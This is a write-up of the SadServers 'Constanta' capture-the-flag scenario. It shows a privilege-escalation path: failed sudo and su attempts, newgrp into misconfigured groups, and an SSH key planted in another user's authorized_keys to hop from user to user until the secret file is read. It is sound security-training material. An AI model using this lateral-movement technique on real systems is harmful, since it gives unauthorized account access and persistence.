## "Constanta": Jumping Frog

### Problem

This is a "hacking" or Capture The Flag challenge. You need to copy the message at /home/user3/secret.txt into the /home/admin/solution.txt file.

Source: https://sadservers.com/scenario/constanta

### Solution

1. check directory permission

only user3 can access `/home/user3/` directory

```
admin@i-07309a33a40e18a57:~$ ls -alt /home
total 24
drwxrwxrwx  5 admin admin 4096 Apr 26 06:09 admin
drwxr-xr-x 18 root  root  4096 Apr 26 06:09 ..
drwxr-x---  3 user3 user3 4096 Apr 25 23:13 user3
drwxr-xr-x  6 root  root  4096 Apr 25 23:10 .
drwxr-x---  3 user2 user2 4096 Apr 25 23:10 user2
drwxr-x---  3 user1 user1 4096 Apr 25 23:10 user1
```

2. try sudo 

```
admin@i-07309a33a40e18a57:~$ sudo -u user3 cat /home/user3/secret.txt

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for admin: 
sudo: a password is required
admin@i-07309a33a40e18a57:~$ sudo cd /home/user3

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for admin: 
sudo: a password is required
```

3. try switch user

```
admin@i-07309a33a40e18a57:~$ su user3
Password: 
su: Authentication failure
admin@i-07309a33a40e18a57:~$ su -
Password: 
su: Authentication failure
```

4. try `chown` and `chmod`

```
admin@i-07309a33a40e18a57:/home$ chown admin user3
chown: changing ownership of 'user3': Operation not permitted
admin@i-07309a33a40e18a57:/home$ sudo chown admin user3

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for admin: 
sudo: a password is required
admin@i-07309a33a40e18a57:/home$ chmod 777 user3
chmod: changing permissions of 'user3': Operation not permitted
admin@i-07309a33a40e18a57:/home$ sudo chmod 777 user3

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for admin: 
sudo: a password is required
```

5. the `cron` daemon is running by `root`

```
admin@i-07309a33a40e18a57:/var$ ps -aux | grep cron
root         596  0.0  0.5   5636  2572 ?        Ss   06:09   0:00 /usr/sbin/cron -f
admin       1111  0.0  0.1   5264   708 pts/0    S<+  06:30   0:00 grep cron
```

6. but no permission to write system-wide cron job

```
admin@i-0620ce01d89162af2:~$ ls -alt /etc/crontab
-rw-r--r-- 1 root root 1042 Feb 22  2021 /etc/crontab
admin@i-0620ce01d89162af2:~$ ls -alt /etc/cron.d
total 16
drwxr-xr-x 71 root root 4096 Apr 26 06:53 ..
drwxr-xr-x  2 root root 4096 Feb  6 04:25 .
-rw-r--r--  1 root root  201 Jun  7  2021 e2scrub_all
-rw-r--r--  1 root root  102 Feb 22  2021 .placeholder
```

7. check group account information.

admin in user1 group, user1 in user2 group, user2 in user3 group

```
admin@i-0620ce01d89162af2:~$ cat /etc/group
...
admin:x:1000:
user1:x:1001:user1,user2,user3,admin
user2:x:1002:user1
user3:x:1003:user2
```

8. try to switch to user1 group

now i can go to the `/home/user`

```
admin@i-0d0a434a48a7ad7f4:~$ newgrp user1
admin@i-0d0a434a48a7ad7f4:~$ id
uid=1000(admin) gid=1001(user1) groups=1001(user1),1000(admin)
admin@i-0d0a434a48a7ad7f4:~$ cd /home/user1
admin@i-0d0a434a48a7ad7f4:/home/user1$ ls
```

9. generate ssh key and let user1 authorise such ssh key so that we can login user1 account via SSH!

```
admin@i-0d0a434a48a7ad7f4:~$ ssh-keygen -t rsa -b 4096 -C ""
Generating public/private rsa key pair.
Enter file in which to save the key (/home/admin/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/admin/.ssh/id_rsa
Your public key has been saved in /home/admin/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:l0Woup8RZDpo2KDsCS+8HQAuuAnHwUGXx8ovr+vkoUY 
The key's randomart image is:
+---[RSA 4096]----+
| .o .o     ..    |
| . o. o   ..     |
|. +. o  o.  .    |
|=o =o. +.  o     |
|*++ +.o.S o      |
|*=E.. o. o       |
|+=..oo ..        |
| .++..o  o       |
| o.o=o .o        |
+----[SHA256]-----+
admin@i-0d0a434a48a7ad7f4:~$ cat .ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDEaHWv/YEWQMFA/w9b6B6/zo3rhMzSSyy9piFlPzASyw8dKcgCoIc5fYyCMgYY30dre/3bQadZeKgTu5EBEXYtZuIU3UTw3lsRjYm3oG36+p+FYgFOa/v4btnrBy0XURsaPTDT2OEIwM0j+2eMSCCavgqFc0MKl4grm90RqyLJ2/i/kB+ofeCTxMyfic2yT+SGygl9x35vzoacOxIaZBlCwRVE8GoIKs2wZyH5Cq4Bmm13EduomaYZdOaBNPDXIm1GKaLgWCi9rOp710CUorYR1Voh+7Zt0WtboO+6ojBssnjyWU2HZLYS5G562/A1RhUJb5w802y/NsS5CqgRe0aS3bUGwLzE4sPTEXCcUYGPHjfsy83P6g/l4/A543OKuJ6qg8PkDL22D5Ocqkl3/j6cplS9LSNAL9cXstP+ttn77mwd5RzSZwf//QI+EImG4u5uylndEZInCTXO84uCICH1zkfM+oyzFnie9Y2c8Skb4yMVbKBcGKIC9gaeLiFAawNott+K1pmIiHNoiTvgCM8nLKd6ELZlcVji45OY+v2urHfT90Z8EHxbx27PnLZdsLoQouai+nfMMV7qw5GNWyFhlKJ/ddnSaNjaiWkQCDH1rkNYAHsmI7JoVJd3+omxlKPsRK3kV/PewlSqwUfaqeurTxGg0O1IEn4QvwYN2GrdYw== 
admin@i-0d0a434a48a7ad7f4:~$ cd /home/user1/.ssh/
admin@i-0d0a434a48a7ad7f4:/home/user1/.ssh$ ls
authorized_keys
admin@i-0d0a434a48a7ad7f4:/home/user1/.ssh$ vim authorized_keys 
admin@i-0d0a434a48a7ad7f4:/home/user1/.ssh$ cd ..
admin@i-0d0a434a48a7ad7f4:/home/user1$ ls
admin@i-0d0a434a48a7ad7f4:/home/user1$ cd /home/admin/.ssh/
admin@i-0d0a434a48a7ad7f4:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
admin@i-0d0a434a48a7ad7f4:~/.ssh$ ssh user1@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:gUekLxmuOzOG3dAJCEARpBI1n/dQ11xdzym5Az2gum4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? ^C
admin@i-0d0a434a48a7ad7f4:~/.ssh$ ssh -i id_rsa user1@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:gUekLxmuOzOG3dAJCEARpBI1n/dQ11xdzym5Az2gum4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Linux i-0d0a434a48a7ad7f4 5.10.0-33-cloud-amd64 #1 SMP Debian 5.10.226-1 (2024-10-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
user1@i-0d0a434a48a7ad7f4:~$ 
```

10. follow step 9 to login user2

11. change to user3 group and view the secret

```
user2@i-0d0a434a48a7ad7f4:~$ newgrp user3
user2@i-0d0a434a48a7ad7f4:~$ id
uid=1002(user2) gid=1003(user3) groups=1003(user3),1001(user1),1002(user2)
user2@i-0d0a434a48a7ad7f4:~/.ssh$ cd /home/user3
user2@i-0d0a434a48a7ad7f4:/home/user3$ ls
secret.txt
user2@i-0d0a434a48a7ad7f4:/home/user3$ cat secret.txt 
Let's meet at the Constanta Casino, at dusk
user2@i-0d0a434a48a7ad7f4:/home/user3$ 
```
